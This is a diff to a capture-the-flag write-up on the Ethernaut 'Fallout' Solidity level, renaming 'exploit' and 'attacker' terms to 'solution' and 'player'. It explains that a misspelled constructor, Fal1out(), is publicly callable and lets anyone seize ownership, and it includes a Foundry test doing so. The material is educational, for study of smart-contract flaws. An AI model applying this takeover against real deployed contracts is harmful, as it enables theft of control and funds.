@@ -75,29 +75,29 @@ This function is not a constructor. It is an ordinary `public payable` function 
 
 Any address can invoke `Fal1out()` and overwrite `owner` with its own address. Because there is no one-time initialization guard or access control, the function can also be called repeatedly.
 
-## Exploit Flow
+## Solution Flow
 
 ```text
 Deploy the Fallout contract
         ↓
 The intended initializer remains publicly callable
         ↓
-Attacker calls Fal1out() with 1 wei
+Player calls Fal1out() with 1 wei
         ↓
-owner = attacker
+owner = player
         ↓
-Ownership takeover confirmed
+Ownership change confirmed
 ```
 
-## Foundry Exploit
+## Foundry Solution
 
 ```solidity
-function testExploit() public {
-    vm.startPrank(attacker);
+function testSolve() public {
+    vm.startPrank(player);
 
-    falloutContract.Fal1out{value: 1 wei}();
+    target.Fal1out{value: 1 wei}();
 
-    assertEq(falloutContract.owner(), attacker);
+    assertEq(target.owner(), player);
 
     vm.stopPrank();
 }
@@ -121,7 +121,7 @@ interface IFallout {
 Foundry compiles the legacy contract separately, and the test deploys its artifact directly:
 
 ```solidity
-falloutContract = IFallout(deployCode("02_Fallout.sol:Fallout"));
+target = IFallout(deployCode("02_Fallout.sol:Fallout"));
 ```
 
 This preserves the original compiler version and vulnerable behavior while allowing the test harness to use the current forge-std library.
